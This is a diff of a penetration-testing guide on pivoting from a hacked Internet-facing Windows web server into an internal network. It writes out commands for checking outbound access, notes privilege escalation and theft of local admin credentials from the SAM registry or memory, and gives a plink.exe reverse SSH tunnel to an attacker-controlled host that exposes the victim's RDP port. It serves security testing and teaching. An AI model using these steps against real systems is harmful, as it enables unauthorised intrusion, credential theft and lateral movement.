@@ -7,31 +7,45 @@ Step 1. During a penetration test you managed to hack a vulnerable Internet faci
         (which is running on a Windows server).
 
 
-Step 2. Using your webshell and native commands like 'Test-NetConnection' (or tools like 'portqry'), you checked that the underlying Windows server 
+Step 2. Using your webshell and native commands like 'Test-NetConnection' (or tools like 'portqry'), check that the underlying Windows server 
         can browse the Internet without going through a corporate proxy.
 
-        + Examples for the command 'Test-NetConnection'
+        + Examples for the PowerShell command 'Test-NetConnection'
           > powershell -c Test-NetConnection google.com -Port 443
           > powershell -c "test-netconnection www.website.com -CommonTCPPort HTTP"
 
         + Examples for the Microsoft command line tool 'portqry.exe' or 'portqryv2.exe' (you will need to upload it on the server)
           > portqry.exe -n <public-IP> -e <port>
-          > portqry.exe -n <public_name_to_query> -e <port>
+          > portqry.exe -n www.website.com -e 443
 
 
-Step 3. If you are lucky your webshell is already running as 'NT AUTHORITY\System' and if not you need to escalate your privileges to become local admin
-        (using for example the juicy potato exploit). Then create a new local admin account or extract local admin creds from SAM registry or memory...
+Step 3. If you are lucky your webshell is already running as 'NT AUTHORITY\System', otherwise you need to escalate your privileges to become local admin
+        (using for example the juicy potato exploit). Then create a new local admin account or extract & crack local admin creds from the SAM registry
+        or live memory...
 
 
-Step 4.  Upload the command line tool 'plink.exe' (included in Putty package) on the underlying Windows server
+Step 4.  Upload the command line tool 'plink.exe' (included in the Putty installation package) on the underlying Windows server
 
 
-Step 5. Create a SSH tunnel using 'plink.exe' to a remote Internet facing server that you control. You can use a Kali Linux VM hosted on AWS or Azure Public Cloud.
+Step 5. Create a SSH tunnel using 'plink.exe' to a remote Internet facing server that you control. 
+        You can use a Kali Linux VM hosted on the AWS Public Cloud platform or the Azure Public Cloud platform.
 
-        > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l <username> -pw <password> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 
+        + Example of command to create an SSH remote port forward rule to be able to log into the compromised server (RDP/3389)
+          > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l <username> -pw <password> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 
 
 
 Step 6. Use RDP over the SSH tunnel to log into the compromised Windows server from Internet and pivot to attack the internal network.
 
-        # apt install rdesktop
-        # rdesktop -u <local-admin-username> 192.168.50.5
+        On a Kali Linux VM you can use 'rdesktop' or 'xfreerdp'...  
+        
+        # sudo apt-get update
+        # sudo apt install rdesktop
+        # rdesktop -u <local-admin-username> <victim-server-local-IP
+        
+        OR
+        
+        # sudo apt-get update
+        # sudo sudo apt install freerdp2-x11 freerdp2-shadow-x11
+        # xfreerdp /f /u:USERNAME /p:PASSWORD /v:<victim-server-local-IP>[:PORT] 
+        
+        
